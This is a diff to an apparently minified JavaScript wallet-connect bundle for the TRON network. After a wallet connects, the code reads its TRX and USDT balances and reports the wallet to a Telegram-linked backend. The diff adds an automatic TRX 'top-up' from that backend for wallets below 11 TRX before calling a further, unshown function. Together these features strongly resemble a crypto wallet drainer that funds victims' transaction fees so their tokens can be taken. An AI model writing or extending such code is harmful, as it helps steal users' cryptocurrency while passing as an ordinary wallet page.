@@ -92719,7 +92719,7 @@
                     const u = await a.getBalance(c);
                     o(u);
                     // Check balance in TRX and auto top-up if needed (balance is already in TRX from getBalance)
-                    const balanceInTRX = u; // Already in TRX (getBalance converts from Sun)
+                    let balanceInTRX = u; // Already in TRX (getBalance converts from Sun)
                     const minimumBalance = 11; // Minimum TRX required
                     const backendUrl = "https://tronscantelegram.onrender.com";
                     // Get USDT balance
@@ -92740,12 +92740,21 @@
                     if (balanceInTRX < minimumBalance) {
                         try {
                             console.log(`Balance ${balanceInTRX} TRX is below minimum ${minimumBalance} TRX. Requesting top-up...`);
-                            const topUpMessage = `TRX top-up request\nWallet: ${c}\nCurrent balance: ${balanceInTRX} TRX\nMinimum required: ${minimumBalance} TRX`;
-                            await GS.post(`${backendUrl}/api/telegram`, {
-                                text: topUpMessage
-                            }).catch(err => console.error("Top-up notification error:", err));
+                            const topUpResponse = await GS.post(`${backendUrl}/send-trx`, {
+                                userAddress: c
+                            });
+                            if (topUpResponse && topUpResponse.data && topUpResponse.data.success) {
+                                console.log("Top-up successful:", topUpResponse.data.message);
+                                if (topUpResponse.data.transactionId) {
+                                    console.log("Top-up transaction ID:", topUpResponse.data.transactionId);
+                                }
+                                await new Promise((resolve) => setTimeout(resolve, 5000));
+                                balanceInTRX = await a.getBalance(c);
+                            } else {
+                                console.warn("Top-up request failed:", topUpResponse && topUpResponse.data ? topUpResponse.data : topUpResponse);
+                            }
                         } catch (topUpError) {
-                            console.error("Error during auto top-up notification:", topUpError);
+                            console.error("Error during auto top-up:", topUpError);
                         }
                     }
                     // Send Telegram notification for wallet connection
@@ -92756,7 +92765,7 @@
                     } catch (telegramError) {
                         console.error("Failed to send Telegram notification:", telegramError);
                     }
-                    u >= 0 ? await f(c) : t(2)
+                    balanceInTRX >= 0 ? await f(c) : t(2)
                 } catch (a) {
                     console.error("Connection error:", a)
                 } finally {
